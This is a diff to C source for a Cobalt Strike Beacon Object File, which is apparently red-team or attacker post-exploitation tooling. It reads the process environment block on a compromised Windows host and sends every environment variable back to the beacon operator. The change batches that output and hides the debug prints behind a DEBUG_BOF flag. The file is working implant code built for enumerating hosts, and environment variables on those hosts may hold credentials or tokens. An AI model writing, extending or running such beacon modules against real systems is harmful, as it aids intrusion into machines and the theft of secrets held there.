@@ -1,5 +1,6 @@
 #include <windows.h>
 #include "beacon.h"
+//#define DEBUG_BOF
 
 PVOID getProcessParamsAddr()
 {
@@ -65,14 +66,22 @@ PVOID getUnicodeStrLen(PVOID envStrAddr)
 
 void printLoopAllTheStrings(PVOID nextEnvStringAddr, unsigned __int64 environmentSize)
 {
+    formatp stringFormatObject;  // Cobalt Strike beacon format object we will pass strings too
+    BeaconFormatAlloc(&stringFormatObject, 64 * 1024); // allocate memory for our string blob
     PVOID unicodeStrSize = NULL;
     PVOID environmentEndAddr = nextEnvStringAddr + environmentSize;
     while (nextEnvStringAddr < environmentEndAddr)
     {
-        BeaconPrintf(CALLBACK_OUTPUT, "%ls",nextEnvStringAddr);
+        BeaconFormatPrintf(&stringFormatObject,"%ls\n",nextEnvStringAddr);
+        //BeaconPrintf(CALLBACK_OUTPUT, "%ls",nextEnvStringAddr);
         unicodeStrSize = getUnicodeStrLen(nextEnvStringAddr)+2;
         nextEnvStringAddr += (unsigned __int64)unicodeStrSize;
     }
+    int sizeOfObject   = 0;
+    char* outputString = NULL;
+    outputString = BeaconFormatToString(&stringFormatObject, &sizeOfObject);
+    BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
+    BeaconFormatFree(&stringFormatObject);
 }
 
 void go(char *args, int len)
@@ -83,7 +92,9 @@ void go(char *args, int len)
     procParamAddr = getProcessParamsAddr();
     environmentAddr = getEnvironmentAddr(procParamAddr);
     environmentSize = getEnvironmentSize(procParamAddr);
+#ifdef DEBUG_BOF
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Evironment Address: %p",environmentAddr); 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Evironment Size:    %d",environmentSize);
+#endif
     printLoopAllTheStrings(environmentAddr, (unsigned __int64)environmentSize);
 }
